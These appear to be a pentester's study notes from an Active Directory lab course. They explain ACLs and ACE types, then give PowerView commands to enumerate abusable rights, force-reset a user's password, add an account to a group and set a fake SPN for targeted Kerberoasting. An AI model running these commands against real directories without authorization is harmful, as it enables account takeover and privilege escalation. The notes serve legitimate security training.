2 types
- Discretionary Access Control List (DACL)
	- Defines which security principals are granted or denied access to an object
	- Made up of Access Control Entries (ACEs) that either allow or deny access
	- If does not exist for object, all granted full rights to access objects
	- If exist but no ACE entries, all denied.
- System Access Control List (SACL) 
	- allow admis to log access attempts made to secured objets

![[Pasted image 20260222154753.png]]


## ACE types
- Access denied ACE
- Access allowed ACE
- System audit ACE

## ACE components
- Security identifier (SID) of user/group with access to object
- Flag denoting type of ACE
- Flags that specify whether or not child containers  inherit given ACE entry from parent object
- Access mask - 32 bit value that defines right granted to object

## ACEs importance
- Some AD object security permissions can be enumerated and visualised with BloodHound, and all abusable with PowerView
- eg.
-  [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a **user**, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a **group** means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

![[Pasted image 20260222155341.png]]

# ACL Enumeration
- **Start with targeted enumeration, starting with user we have control over.**
	- eg. we have user `wley`
## PowerView
- Get SID of user
	- `Import-Module .\PowerView.ps1
	- `$sid = Convert-NameToSid wley`
- Find all domain objects that our user has rights over
	- `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
	- If -Resolve GUIDs doesnt work, remove the flag and just google the ObjectAceType GUID to find which right it is

## Without Powerview
- Slower method, not as good. Just FYI
- Get list of Domain Users, store in ad_users.txt
	- `Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
- For the domain users found above, use Get-Acl to get ACL info, then select the Access property to show info about access rights. Then set IdentityReference property to the user we are in control of/looking to see rights of, in this case wley
```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    Get-Acl "AD:\$(Get-ADUser $line)" |
    Select-Object Path -ExpandProperty Access |
    Where-Object { $_.IdentityReference -match 'INLANEFREIGHT\\wley' }
}
```
	- Edit path to ad_users.txt

# Further enumeration
Start with the user found
- `$sid2 = Convert-NameToSid damundsen
- `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

- Check results
	- Again, can google the GUID to see the rights.
	- What kind of object is returned? Check Common Name (CN) 
		- Eg. Dana Amundsen -> user object
		- Eg. Help Desk Level 1 -> group
	- If it is a user,
		- Get the target's sAMAccountName
		- `Get-ADUser -Identity "CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL" | Select SamAccountName`
			- eg. `damundsen` -> `<target>`
		- `Get ADUser <target> -Properties MemberOf,adminCount`
	- If it is a group,
		- `Get ADGroup <group> -Properties MemberOf`
	- Enumerate based on the rights of the ACE.
		- eg.
		- We have GenericWrite access over a group
		- This means we can add any user (or ourselves) to this group and inherit rights this group has applied to it.
		- Check if group is nested into any other groups
			- `Get-DomainGroup -Identity "Help Desk Level 1" | select memberof`
				- Result: InformationTechnology
			- Help Desk is a member of `Information Technology` group, which granted members of that groups any rights provided to `Information Technology`
			- Then check what `Information Technology` rights are
				- ``$sid2 = Convert-NameToSid "Information Technology"
				- `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose`
				- We see that `Information Technology` has GenericAll rights over Angela Dunn
				- Enumerate Angela Dunn and so on and so forth


# ACL Enumeration & Tactics
## Password change with ForceChangePassword rights
Authenticating as a wley with creds for him
```
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
- $Cred now represents a PSCredential object, representing authenticated access as `wley`

Creating new password for damundsen (assume wley has ForceChangePassword rights over damundsen)
```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Restting damundsen's password with wley user
```
cd C:\Tools\
Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

## Adding to Group
Adding damundsen to group
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

To verify membership
```
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
- To check that damundsen is now part of this group
```

## Kerberoasting
Authenticated to damundsen, who is in group 'Help Desk Level 1' which intherits from "Information Technology", which has GenericAll rights to adunn
- Assume not allowed to change password of adunn
- Create fake SPN for adunn, then perform targeted Kerberoasting attack

Create fake SPN
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

